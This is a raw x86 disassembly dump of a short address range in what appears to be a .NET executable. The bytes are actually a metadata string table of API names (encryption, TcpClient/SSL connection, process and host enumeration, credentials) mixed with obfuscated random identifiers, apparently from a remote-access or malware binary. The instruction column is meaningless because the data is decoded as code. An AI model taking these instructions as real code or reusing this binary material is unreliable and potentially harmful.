  40957b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409580:	6e                   	outsb  %ds:(%esi),(%dx)
  409581:	73 2e                	jae    0x4095b1
  409583:	49                   	dec    %ecx
  409584:	45                   	inc    %ebp
  409585:	6e                   	outsb  %ds:(%esi),(%dx)
  409586:	75 6d                	jne    0x4095f5
  409588:	65 72 61             	gs jb  0x4095ec
  40958b:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  40958f:	47                   	inc    %edi
  409590:	65 74 45             	gs je  0x4095d8
  409593:	6e                   	outsb  %ds:(%esi),(%dx)
  409594:	75 6d                	jne    0x409603
  409596:	65 72 61             	gs jb  0x4095fa
  409599:	74 6f                	je     0x40960a
  40959b:	72 00                	jb     0x40959d
  40959d:	41                   	inc    %ecx
  40959e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4095a2:	61                   	popa
  4095a3:	74 6f                	je     0x409614
  4095a5:	72 00                	jb     0x4095a7
  4095a7:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4095ac:	00 2e                	add    %ch,(%esi)
  4095ae:	63 63 74             	arpl   %esp,0x74(%ebx)
  4095b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4095b2:	72 00                	jb     0x4095b4
  4095b4:	4d                   	dec    %ebp
  4095b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4095b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b7:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  4095be:	65 
  4095bf:	61                   	popa
  4095c0:	74 65                	je     0x409627
  4095c2:	44                   	inc    %esp
  4095c3:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4095c7:	70 74                	jo     0x40963d
  4095c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4095ca:	72 00                	jb     0x4095cc
  4095cc:	43                   	inc    %ebx
  4095cd:	72 65                	jb     0x409634
  4095cf:	61                   	popa
  4095d0:	74 65                	je     0x409637
  4095d2:	45                   	inc    %ebp
  4095d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4095d4:	63 72 79             	arpl   %esi,0x79(%edx)
  4095d7:	70 74                	jo     0x40964d
  4095d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4095da:	72 00                	jb     0x4095dc
  4095dc:	49                   	dec    %ecx
  4095dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4095de:	74 50                	je     0x409630
  4095e0:	74 72                	je     0x409654
  4095e2:	00 46 68             	add    %al,0x68(%esi)
  4095e5:	49                   	dec    %ecx
  4095e6:	5a                   	pop    %edx
  4095e7:	51                   	push   %ecx
  4095e8:	4c                   	dec    %esp
  4095e9:	52                   	push   %edx
  4095ea:	58                   	pop    %eax
  4095eb:	72 41                	jb     0x40962e
  4095ed:	76 72                	jbe    0x409661
  4095ef:	00 51 67             	add    %dl,0x67(%ecx)
  4095f2:	6d                   	insl   (%dx),%es:(%edi)
  4095f3:	53                   	push   %ebx
  4095f4:	65 4f                	gs dec %edi
  4095f6:	58                   	pop    %eax
  4095f7:	4c                   	dec    %esp
  4095f8:	75 6f                	jne    0x409669
  4095fa:	43                   	inc    %ebx
  4095fb:	79 70                	jns    0x40966d
  4095fd:	78 72                	js     0x409671
  4095ff:	00 62 4b             	add    %ah,0x4b(%edx)
  409602:	72 52                	jb     0x409656
  409604:	42                   	inc    %edx
  409605:	57                   	push   %edi
  409606:	43                   	inc    %ebx
  409607:	59                   	pop    %ecx
  409608:	4b                   	dec    %ebx
  409609:	74 4f                	je     0x40965a
  40960b:	59                   	pop    %ecx
  40960c:	41                   	inc    %ecx
  40960d:	73 00                	jae    0x40960f
  40960f:	65 52                	gs push %edx
  409611:	6b 44 44 61 63       	imul   $0x63,0x61(%esp,%eax,2),%eax
  409616:	5a                   	pop    %edx
  409617:	61                   	popa
  409618:	41                   	inc    %ecx
  409619:	74 68                	je     0x409683
  40961b:	41                   	inc    %ecx
  40961c:	73 00                	jae    0x40961e
  40961e:	44                   	inc    %esp
  40961f:	76 70                	jbe    0x409691
  409621:	4f                   	dec    %edi
  409622:	62 4e 79             	bound  %ecx,0x79(%esi)
  409625:	68 45 73 00 6e       	push   $0x6e007345
  40962a:	6c                   	insb   (%dx),%es:(%edi)
  40962b:	4a                   	dec    %edx
  40962c:	47                   	inc    %edi
  40962d:	78 69                	js     0x409698
  40962f:	6d                   	insl   (%dx),%es:(%edi)
  409630:	52                   	push   %edx
  409631:	68 64 59 67 79       	push   $0x79675964
  409636:	79 4d                	jns    0x409685
  409638:	73 00                	jae    0x40963a
  40963a:	48                   	dec    %eax
  40963b:	71 4e                	jno    0x40968b
  40963d:	4b                   	dec    %ebx
  40963e:	47                   	inc    %edi
  40963f:	54                   	push   %esp
  409640:	55                   	push   %ebp
  409641:	58                   	pop    %eax
  409642:	4d                   	dec    %ebp
  409643:	54                   	push   %esp
  409644:	73 00                	jae    0x409646
  409646:	70 49                	jo     0x409691
  409648:	64 79 4c             	fs jns 0x409697
  40964b:	55                   	push   %ebp
  40964c:	47                   	inc    %edi
  40964d:	76 51                	jbe    0x4096a0
  40964f:	66 78 55             	data16 js 0x4096a7
  409652:	73 00                	jae    0x409654
  409654:	55                   	push   %ebp
  409655:	46                   	inc    %esi
  409656:	46                   	inc    %esi
  409657:	5a                   	pop    %edx
  409658:	77 78                	ja     0x4096d2
  40965a:	5a                   	pop    %edx
  40965b:	6a 61                	push   $0x61
  40965d:	69 57 73 00 53 79 73 	imul   $0x73795300,0x73(%edi),%edx
  409664:	74 65                	je     0x4096cb
  409666:	6d                   	insl   (%dx),%es:(%edi)
  409667:	2e 44                	cs inc %esp
  409669:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  409670:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  409677:	72 6f                	jb     0x4096e8
  409679:	73 6f                	jae    0x4096ea
  40967b:	66 74 2e             	data16 je 0x4096ac
  40967e:	56                   	push   %esi
  40967f:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  409686:	73 69                	jae    0x4096f1
  409688:	63 2e                	arpl   %ebp,(%esi)
  40968a:	44                   	inc    %esp
  40968b:	65 76 69             	gs jbe 0x4096f7
  40968e:	63 65 73             	arpl   %esp,0x73(%ebp)
  409691:	00 53 79             	add    %dl,0x79(%ebx)
  409694:	73 74                	jae    0x40970a
  409696:	65 6d                	gs insl (%dx),%es:(%edi)
  409698:	2e 52                	cs push %edx
  40969a:	75 6e                	jne    0x40970a
  40969c:	74 69                	je     0x409707
  40969e:	6d                   	insl   (%dx),%es:(%edi)
  40969f:	65 2e 49             	gs cs dec %ecx
  4096a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4096a3:	74 65                	je     0x40970a
  4096a5:	72 6f                	jb     0x409716
  4096a7:	70 53                	jo     0x4096fc
  4096a9:	65 72 76             	gs jb  0x409722
  4096ac:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4096b3:	73 74                	jae    0x409729
  4096b5:	65 6d                	gs insl (%dx),%es:(%edi)
  4096b7:	2e 52                	cs push %edx
  4096b9:	75 6e                	jne    0x409729
  4096bb:	74 69                	je     0x409726
  4096bd:	6d                   	insl   (%dx),%es:(%edi)
  4096be:	65 2e 43             	gs cs inc %ebx
  4096c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4096c2:	6d                   	insl   (%dx),%es:(%edi)
  4096c3:	70 69                	jo     0x40972e
  4096c5:	6c                   	insb   (%dx),%es:(%edi)
  4096c6:	65 72 53             	gs jb  0x40971c
  4096c9:	65 72 76             	gs jb  0x409742
  4096cc:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4096d3:	62 75 67             	bound  %esi,0x67(%ebp)
  4096d6:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4096dd:	65 
  4096de:	73 00                	jae    0x4096e0
  4096e0:	45                   	inc    %ebp
  4096e1:	78 70                	js     0x409753
  4096e3:	61                   	popa
  4096e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4096e5:	64 45                	fs inc %ebp
  4096e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4096e8:	76 69                	jbe    0x409753
  4096ea:	72 6f                	jb     0x40975b
  4096ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ed:	6d                   	insl   (%dx),%es:(%edi)
  4096ee:	65 6e                	outsb  %gs:(%esi),(%dx)
  4096f0:	74 56                	je     0x409748
  4096f2:	61                   	popa
  4096f3:	72 69                	jb     0x40975e
  4096f5:	61                   	popa
  4096f6:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  4096fa:	00 47 65             	add    %al,0x65(%edi)
  4096fd:	74 50                	je     0x40974f
  4096ff:	72 6f                	jb     0x409770
  409701:	63 65 73             	arpl   %esp,0x73(%ebp)
  409704:	73 65                	jae    0x40976b
  409706:	73 00                	jae    0x409708
  409708:	47                   	inc    %edi
  409709:	65 74 48             	gs je  0x409754
  40970c:	6f                   	outsl  %ds:(%esi),(%dx)
  40970d:	73 74                	jae    0x409783
  40970f:	41                   	inc    %ecx
  409710:	64 64 72 65          	fs fs jb 0x409779
  409714:	73 73                	jae    0x409789
  409716:	65 73 00             	gs jae 0x409719
  409719:	53                   	push   %ebx
  40971a:	79 73                	jns    0x40978f
  40971c:	74 65                	je     0x409783
  40971e:	6d                   	insl   (%dx),%es:(%edi)
  40971f:	2e 53                	cs push %ebx
  409721:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409725:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40972c:	70 
  40972d:	74 6f                	je     0x40979e
  40972f:	67 72 61             	addr16 jb 0x409793
  409732:	70 68                	jo     0x40979c
  409734:	79 2e                	jns    0x409764
  409736:	58                   	pop    %eax
  409737:	35 30 39 43 65       	xor    $0x65433930,%eax
  40973c:	72 74                	jb     0x4097b2
  40973e:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409745:	73 00                	jae    0x409747
  409747:	52                   	push   %edx
  409748:	66 63 32             	arpl   %si,(%edx)
  40974b:	38 39                	cmp    %bh,(%ecx)
  40974d:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  409751:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  409758:	73 00                	jae    0x40975a
  40975a:	52                   	push   %edx
  40975b:	65 61                	gs popa
  40975d:	64 41                	fs inc %ecx
  40975f:	6c                   	insb   (%dx),%es:(%edi)
  409760:	6c                   	insb   (%dx),%es:(%edi)
  409761:	42                   	inc    %edx
  409762:	79 74                	jns    0x4097d8
  409764:	65 73 00             	gs jae 0x409767
  409767:	47                   	inc    %edi
  409768:	65 74 42             	gs je  0x4097ad
  40976b:	79 74                	jns    0x4097e1
  40976d:	65 73 00             	gs jae 0x409770
  409770:	70 6e                	jo     0x4097e0
  409772:	65 55                	gs push %ebp
  409774:	75 67                	jne    0x4097dd
  409776:	62 57 66             	bound  %edx,0x66(%edi)
  409779:	73 00                	jae    0x40977b
  40977b:	43                   	inc    %ebx
  40977c:	53                   	push   %ebx
  40977d:	68 61 72 70 41       	push   $0x41707261
  409782:	72 67                	jb     0x4097eb
  409784:	75 6d                	jne    0x4097f3
  409786:	65 6e                	outsb  %gs:(%esi),(%dx)
  409788:	74 49                	je     0x4097d3
  40978a:	6e                   	outsb  %ds:(%esi),(%dx)
  40978b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40978d:	46                   	inc    %esi
  40978e:	6c                   	insb   (%dx),%es:(%edi)
  40978f:	61                   	popa
  409790:	67 73 00             	addr16 jae 0x409793
  409793:	43                   	inc    %ebx
  409794:	53                   	push   %ebx
  409795:	68 61 72 70 42       	push   $0x42707261
  40979a:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  4097a1:	61                   	popa
  4097a2:	67 73 00             	addr16 jae 0x4097a5
  4097a5:	53                   	push   %ebx
  4097a6:	74 72                	je     0x40981a
  4097a8:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4097af:	73 73                	jae    0x409824
  4097b1:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4097b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4097b9:	67 45                	addr16 inc %ebp
  4097bb:	76 65                	jbe    0x409822
  4097bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4097be:	74 41                	je     0x409801
  4097c0:	72 67                	jb     0x409829
  4097c2:	73 00                	jae    0x4097c4
  4097c4:	49                   	dec    %ecx
  4097c5:	43                   	inc    %ebx
  4097c6:	72 65                	jb     0x40982d
  4097c8:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4097cb:	74 69                	je     0x409836
  4097cd:	61                   	popa
  4097ce:	6c                   	insb   (%dx),%es:(%edi)
  4097cf:	73 00                	jae    0x4097d1
  4097d1:	73 65                	jae    0x409838
  4097d3:	74 5f                	je     0x409834
  4097d5:	43                   	inc    %ebx
  4097d6:	72 65                	jb     0x40983d
  4097d8:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4097db:	74 69                	je     0x409846
  4097dd:	61                   	popa
  4097de:	6c                   	insb   (%dx),%es:(%edi)
  4097df:	73 00                	jae    0x4097e1
  4097e1:	45                   	inc    %ebp
  4097e2:	71 75                	jno    0x409859
  4097e4:	61                   	popa
  4097e5:	6c                   	insb   (%dx),%es:(%edi)
  4097e6:	73 00                	jae    0x4097e8
  4097e8:	53                   	push   %ebx
  4097e9:	73 6c                	jae    0x409857
  4097eb:	50                   	push   %eax
  4097ec:	72 6f                	jb     0x40985d
  4097ee:	74 6f                	je     0x40985f
  4097f0:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4097f3:	73 00                	jae    0x4097f5
  4097f5:	73 4d                	jae    0x409844
  4097f7:	42                   	inc    %edx
  4097f8:	7a 67                	jp     0x409861
  4097fa:	5a                   	pop    %edx
  4097fb:	47                   	inc    %edi
  4097fc:	4e                   	dec    %esi
  4097fd:	44                   	inc    %esp
  4097fe:	41                   	inc    %ecx
  4097ff:	61                   	popa
  409800:	6d                   	insl   (%dx),%es:(%edi)
  409801:	73 00                	jae    0x409803
  409803:	53                   	push   %ebx
  409804:	79 73                	jns    0x409879
  409806:	74 65                	je     0x40986d
  409808:	6d                   	insl   (%dx),%es:(%edi)
  409809:	2e 57                	cs push %edi
  40980b:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409812:	46                   	inc    %esi
  409813:	6f                   	outsl  %ds:(%esi),(%dx)
  409814:	72 6d                	jb     0x409883
  409816:	73 00                	jae    0x409818
  409818:	44                   	inc    %esp
  409819:	6e                   	outsb  %ds:(%esi),(%dx)
  40981a:	73 00                	jae    0x40981c
  40981c:	43                   	inc    %ebx
  40981d:	6f                   	outsl  %ds:(%esi),(%dx)
  40981e:	6e                   	outsb  %ds:(%esi),(%dx)
  40981f:	74 61                	je     0x409882
  409821:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409828:	74 65                	je     0x40988f
  40982a:	6d                   	insl   (%dx),%es:(%edi)
  40982b:	2e 43                	cs inc %ebx
  40982d:	6f                   	outsl  %ds:(%esi),(%dx)
  40982e:	6c                   	insb   (%dx),%es:(%edi)
  40982f:	6c                   	insb   (%dx),%es:(%edi)
  409830:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409835:	6e                   	outsb  %ds:(%esi),(%dx)
  409836:	73 00                	jae    0x409838
  409838:	53                   	push   %ebx
  409839:	74 72                	je     0x4098ad
  40983b:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409842:	74 4f                	je     0x409893
  409844:	70 74                	jo     0x4098ba
  409846:	69 6f 6e 73 00 56 6d 	imul   $0x6d560073,0x6e(%edi),%ebp
  40984d:	7a 6b                	jp     0x4098ba
  40984f:	4a                   	dec    %edx
  409850:	56                   	push   %esi
  409851:	6b 41 42 68          	imul   $0x68,0x42(%ecx),%eax
  409855:	63 71 73             	arpl   %esi,0x73(%ecx)
  409858:	00 47 65             	add    %al,0x65(%edi)
  40985b:	74 49                	je     0x4098a6
  40985d:	6d                   	insl   (%dx),%es:(%edi)
  40985e:	61                   	popa
  40985f:	67 65 44             	addr16 gs inc %esp
  409862:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409866:	65 72 73             	gs jb  0x4098dc
  409869:	00 52 75             	add    %dl,0x75(%edx)
  40986c:	6e                   	outsb  %ds:(%esi),(%dx)
  40986d:	74 69                	je     0x4098d8
  40986f:	6d                   	insl   (%dx),%es:(%edi)
  409870:	65 48                	gs dec %eax
  409872:	65 6c                	gs insb (%dx),%es:(%edi)
  409874:	70 65                	jo     0x4098db
  409876:	72 73                	jb     0x4098eb
  409878:	00 53 73             	add    %dl,0x73(%ebx)
  40987b:	6c                   	insb   (%dx),%es:(%edi)
  40987c:	50                   	push   %eax
  40987d:	6f                   	outsl  %ds:(%esi),(%dx)
  40987e:	6c                   	insb   (%dx),%es:(%edi)
  40987f:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409886:	72 73                	jb     0x4098fb
  409888:	00 46 69             	add    %al,0x69(%esi)
  40988b:	6c                   	insb   (%dx),%es:(%edi)
  40988c:	65 41                	gs inc %ecx
  40988e:	63 63 65             	arpl   %esp,0x65(%ebx)
  409891:	73 73                	jae    0x409906
  409893:	00 47 65             	add    %al,0x65(%edi)
  409896:	74 43                	je     0x4098db
  409898:	75 72                	jne    0x40990c
  40989a:	72 65                	jb     0x409901
  40989c:	6e                   	outsb  %ds:(%esi),(%dx)
  40989d:	74 50                	je     0x4098ef
  40989f:	72 6f                	jb     0x409910
  4098a1:	63 65 73             	arpl   %esp,0x73(%ebp)
  4098a4:	73 00                	jae    0x4098a6
  4098a6:	49                   	dec    %ecx
  4098a7:	50                   	push   %eax
  4098a8:	41                   	inc    %ecx
  4098a9:	64 64 72 65          	fs fs jb 0x409912
  4098ad:	73 73                	jae    0x409922
  4098af:	00 53 79             	add    %dl,0x79(%ebx)
  4098b2:	73 74                	jae    0x409928
  4098b4:	65 6d                	gs insl (%dx),%es:(%edi)
  4098b6:	2e 4e                	cs dec %esi
  4098b8:	65 74 2e             	gs je  0x4098e9
  4098bb:	53                   	push   %ebx
  4098bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4098bd:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4098c0:	74 73                	je     0x409935
  4098c2:	00 73 65             	add    %dh,0x65(%ebx)
  4098c5:	74 5f                	je     0x409926
  4098c7:	41                   	inc    %ecx
  4098c8:	72 67                	jb     0x409931
  4098ca:	75 6d                	jne    0x409939
  4098cc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4098ce:	74 73                	je     0x409943
  4098d0:	00 53 79             	add    %dl,0x79(%ebx)
  4098d3:	73 74                	jae    0x409949
  4098d5:	65 6d                	gs insl (%dx),%es:(%edi)
  4098d7:	45                   	inc    %ebp
  4098d8:	76 65                	jbe    0x40993f
  4098da:	6e                   	outsb  %ds:(%esi),(%dx)
  4098db:	74 73                	je     0x409950
  4098dd:	00 45 78             	add    %al,0x78(%ebp)
  4098e0:	69 73 74 73 00 42 48 	imul   $0x48420073,0x74(%ebx),%esi
  4098e7:	55                   	push   %ebp
  4098e8:	52                   	push   %edx
  4098e9:	78 41                	js     0x40992c
  4098eb:	42                   	inc    %edx
  4098ec:	6a 50                	push   $0x50
  4098ee:	4e                   	dec    %esi
  4098ef:	73 55                	jae    0x409946
  4098f1:	55                   	push   %ebp
  4098f2:	76 73                	jbe    0x409967
  4098f4:	00 57 57             	add    %dl,0x57(%edi)
  4098f7:	4b                   	dec    %ebx
  4098f8:	6b 6a 6a 57          	imul   $0x57,0x6a(%edx),%ebp
  4098fc:	77 76                	ja     0x409974
  4098fe:	73 00                	jae    0x409900
  409900:	77 43                	ja     0x409945
  409902:	41                   	inc    %ecx
  409903:	72 75                	jb     0x40997a
  409905:	70 4f                	jo     0x409956
  409907:	68 6b 66 66 54       	push   $0x5466666b
  40990c:	4d                   	dec    %ebp
  40990d:	74 00                	je     0x40990f
  40990f:	47                   	inc    %edi
  409910:	67 66 55             	addr16 push %bp
  409913:	6f                   	outsl  %ds:(%esi),(%dx)
  409914:	6b 70 55 53          	imul   $0x53,0x55(%eax),%esi
  409918:	74 00                	je     0x40991a
  40991a:	6c                   	insb   (%dx),%es:(%edi)
  40991b:	59                   	pop    %ecx
  40991c:	76 78                	jbe    0x409996
  40991e:	76 41                	jbe    0x409961
  409920:	64 43                	fs inc %ebx
  409922:	76 53                	jbe    0x409977
  409924:	74 00                	je     0x409926
  409926:	72 44                	jb     0x40996c
  409928:	51                   	push   %ecx
  409929:	47                   	inc    %edi
  40992a:	6a 4d                	push   $0x4d
  40992c:	66 51                	push   %cx
  40992e:	50                   	push   %eax
  40992f:	54                   	push   %esp
  409930:	74 00                	je     0x409932
  409932:	43                   	inc    %ebx
  409933:	6f                   	outsl  %ds:(%esi),(%dx)
  409934:	6e                   	outsb  %ds:(%esi),(%dx)
  409935:	63 61 74             	arpl   %esp,0x74(%ecx)
  409938:	00 49 6d             	add    %cl,0x6d(%ecx)
  40993b:	61                   	popa
  40993c:	67 65 46             	addr16 gs inc %esi
  40993f:	6f                   	outsl  %ds:(%esi),(%dx)
  409940:	72 6d                	jb     0x4099af
  409942:	61                   	popa
  409943:	74 00                	je     0x409945
  409945:	67 65 74 5f          	addr16 gs je 0x4099a8
  409949:	41                   	inc    %ecx
  40994a:	73 46                	jae    0x409992
  40994c:	6c                   	insb   (%dx),%es:(%edi)
  40994d:	6f                   	outsl  %ds:(%esi),(%dx)
  40994e:	61                   	popa
  40994f:	74 00                	je     0x409951
  409951:	73 65                	jae    0x4099b8
  409953:	74 5f                	je     0x4099b4
  409955:	41                   	inc    %ecx
  409956:	73 46                	jae    0x40999e
  409958:	6c                   	insb   (%dx),%es:(%edi)
  409959:	6f                   	outsl  %ds:(%esi),(%dx)
  40995a:	61                   	popa
  40995b:	74 00                	je     0x40995d
  40995d:	4d                   	dec    %ebp
  40995e:	61                   	popa
  40995f:	6e                   	outsb  %ds:(%esi),(%dx)
  409960:	61                   	popa
  409961:	67 65 6d             	gs insl (%dx),%es:(%di)
  409964:	65 6e                	outsb  %gs:(%esi),(%dx)
  409966:	74 42                	je     0x4099aa
  409968:	61                   	popa
  409969:	73 65                	jae    0x4099d0
  40996b:	4f                   	dec    %edi
  40996c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40996f:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409973:	6f                   	outsl  %ds:(%esi),(%dx)
  409974:	6c                   	insb   (%dx),%es:(%edi)
  409975:	6c                   	insb   (%dx),%es:(%edi)
  409976:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40997b:	6f                   	outsl  %ds:(%esi),(%dx)
  40997c:	6e                   	outsb  %ds:(%esi),(%dx)
  40997d:	6e                   	outsb  %ds:(%esi),(%dx)
  40997e:	65 63 74 00 4e       	arpl   %esi,%gs:0x4e(%eax,%eax,1)
  409983:	61                   	popa
  409984:	7a 53                	jp     0x4099d9
  409986:	59                   	pop    %ecx
  409987:	49                   	dec    %ecx
  409988:	67 44                	addr16 inc %esp
  40998a:	4c                   	dec    %esp
  40998b:	64 74 00             	fs je  0x40998e
  40998e:	47                   	inc    %edi
  40998f:	65 74 00             	gs je  0x409992
  409992:	53                   	push   %ebx
  409993:	79 73                	jns    0x409a08
  409995:	74 65                	je     0x4099fc
  409997:	6d                   	insl   (%dx),%es:(%edi)
  409998:	2e 4e                	cs dec %esi
  40999a:	65 74 00             	gs je  0x40999d
  40999d:	54                   	push   %esp
  40999e:	61                   	popa
  40999f:	72 67                	jb     0x409a08
  4099a1:	65 74 00             	gs je  0x4099a4
  4099a4:	53                   	push   %ebx
  4099a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a6:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4099a9:	74 00                	je     0x4099ab
  4099ab:	53                   	push   %ebx
  4099ac:	79 73                	jns    0x409a21
  4099ae:	74 65                	je     0x409a15
  4099b0:	6d                   	insl   (%dx),%es:(%edi)
  4099b1:	2e 43                	cs inc %ebx
  4099b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4099b4:	6c                   	insb   (%dx),%es:(%edi)
  4099b5:	6c                   	insb   (%dx),%es:(%edi)
  4099b6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4099bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4099bc:	73 2e                	jae    0x4099ec
  4099be:	49                   	dec    %ecx
  4099bf:	45                   	inc    %ebp
  4099c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4099c1:	75 6d                	jne    0x409a30
  4099c3:	65 72 61             	gs jb  0x409a27
  4099c6:	74 6f                	je     0x409a37
  4099c8:	72 2e                	jb     0x4099f8
  4099ca:	52                   	push   %edx
  4099cb:	65 73 65             	gs jae 0x409a33
  4099ce:	74 00                	je     0x4099d0
  4099d0:	67 65 74 5f          	addr16 gs je 0x409a33
  4099d4:	4f                   	dec    %edi
  4099d5:	66 66 73 65          	data16 data16 jae 0x409a3e
  4099d9:	74 00                	je     0x4099db
  4099db:	73 65                	jae    0x409a42
  4099dd:	74 5f                	je     0x409a3e
  4099df:	4f                   	dec    %edi
  4099e0:	66 66 73 65          	data16 data16 jae 0x409a49
  4099e4:	74 00                	je     0x4099e6
  4099e6:	53                   	push   %ebx
  4099e7:	70 6c                	jo     0x409a55
  4099e9:	69 74 00 57 4e 4d 42 	imul   $0x75424d4e,0x57(%eax,%eax,1),%esi
  4099f0:	75 
  4099f1:	70 6a                	jo     0x409a5d
  4099f3:	74 68                	je     0x409a5d
  4099f5:	44                   	inc    %esp
  4099f6:	65 71 69             	gs jno 0x409a62
  4099f9:	74 00                	je     0x4099fb
  4099fb:	45                   	inc    %ebp
  4099fc:	78 69                	js     0x409a67
  4099fe:	74 00                	je     0x409a00
  409a00:	49                   	dec    %ecx
  409a01:	41                   	inc    %ecx
  409a02:	73 79                	jae    0x409a7d
  409a04:	6e                   	outsb  %ds:(%esi),(%dx)
  409a05:	63 52 65             	arpl   %edx,0x65(%edx)
  409a08:	73 75                	jae    0x409a7f
  409a0a:	6c                   	insb   (%dx),%es:(%edi)
  409a0b:	74 00                	je     0x409a0d
  409a0d:	54                   	push   %esp
  409a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  409a0f:	55                   	push   %ebp
  409a10:	70 70                	jo     0x409a82
  409a12:	65 72 49             	gs jb  0x409a5e
  409a15:	6e                   	outsb  %ds:(%esi),(%dx)
  409a16:	76 61                	jbe    0x409a79
  409a18:	72 69                	jb     0x409a83
  409a1a:	61                   	popa
  409a1b:	6e                   	outsb  %ds:(%esi),(%dx)
  409a1c:	74 00                	je     0x409a1e
  409a1e:	57                   	push   %edi
  409a1f:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a23:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a2a:	74 5f                	je     0x409a8b
  409a2c:	53                   	push   %ebx
  409a2d:	73 6c                	jae    0x409a9b
  409a2f:	43                   	inc    %ebx
  409a30:	6c                   	insb   (%dx),%es:(%edi)
  409a31:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a38:	74 5f                	je     0x409a99
  409a3a:	53                   	push   %ebx
  409a3b:	73 6c                	jae    0x409aa9
  409a3d:	43                   	inc    %ebx
  409a3e:	6c                   	insb   (%dx),%es:(%edi)
  409a3f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a46:	74 5f                	je     0x409aa7
  409a48:	54                   	push   %esp
  409a49:	63 70 43             	arpl   %esi,0x43(%eax)
  409a4c:	6c                   	insb   (%dx),%es:(%edi)
  409a4d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a54:	74 5f                	je     0x409ab5
  409a56:	54                   	push   %esp
  409a57:	63 70 43             	arpl   %esi,0x43(%eax)
  409a5a:	6c                   	insb   (%dx),%es:(%edi)
  409a5b:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409a62:	74 68                	je     0x409acc
  409a64:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a66:	74 69                	je     0x409ad1
  409a68:	63 61 74             	arpl   %esp,0x74(%ecx)
  409a6b:	65 41                	gs inc %ecx
  409a6d:	73 43                	jae    0x409ab2
  409a6f:	6c                   	insb   (%dx),%es:(%edi)
  409a70:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409a77:	73 74                	jae    0x409aed
  409a79:	65 6d                	gs insl (%dx),%es:(%edi)
  409a7b:	2e 4d                	cs dec %ebp
  409a7d:	61                   	popa
  409a7e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a7f:	61                   	popa
  409a80:	67 65 6d             	gs insl (%dx),%es:(%di)
  409a83:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a85:	74 00                	je     0x409a87
  409a87:	45                   	inc    %ebp
  409a88:	6e                   	outsb  %ds:(%esi),(%dx)
  409a89:	76 69                	jbe    0x409af4
  409a8b:	72 6f                	jb     0x409afc
  409a8d:	6e                   	outsb  %ds:(%esi),(%dx)
